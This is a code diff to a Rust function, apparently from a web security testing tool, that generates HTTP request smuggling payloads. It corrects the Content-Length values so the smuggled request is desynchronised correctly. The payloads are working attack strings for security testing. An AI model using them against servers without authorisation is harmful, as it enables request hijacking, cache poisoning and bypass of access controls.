@@ -114,19 +114,27 @@ pub fn get_h2_payloads(
         method, path, host, custom_header_str, cookie_str, host
     ));
 
-    // Multiple Content-Length headers (forbidden in HTTP/2 but might be forwarded)
+    // Multiple Content-Length headers (forbidden in HTTP/2 but might be forwarded).
+    // The second (larger) Content-Length must equal the smuggled request's byte
+    // length so a back-end that honors it consumes exactly the smuggled request
+    // and leaves the socket clean. A hardcoded length only matched a 10-char host.
+    let h2_dual_cl_smuggled = format!("GET /smuggled HTTP/1.1\r\nHost: {}\r\n\r\n", host);
     payloads.push(format!(
         "{} {} HTTP/1.1\r\n\
          Host: {}\r\n\
          {}\
          {}\
          Content-Length: 0\r\n\
-         Content-Length: 44\r\n\
+         Content-Length: {}\r\n\
          \r\n\
-         GET /smuggled HTTP/1.1\r\n\
-         Host: {}\r\n\
-         \r\n",
-        method, path, host, custom_header_str, cookie_str, host
+         {}",
+        method,
+        path,
+        host,
+        custom_header_str,
+        cookie_str,
+        h2_dual_cl_smuggled.len(),
+        h2_dual_cl_smuggled
     ));
 
     // === Header Value with Newline Attacks ===
@@ -373,7 +381,7 @@ pub fn get_h2_payloads(
          {}\
          {}\
          :authority: {}\r\n\
-         Content-Length: 10\r\n\
+         Content-Length: 8\r\n\
          Content-Length: 0\r\n\
          \r\n\
          smuggled",
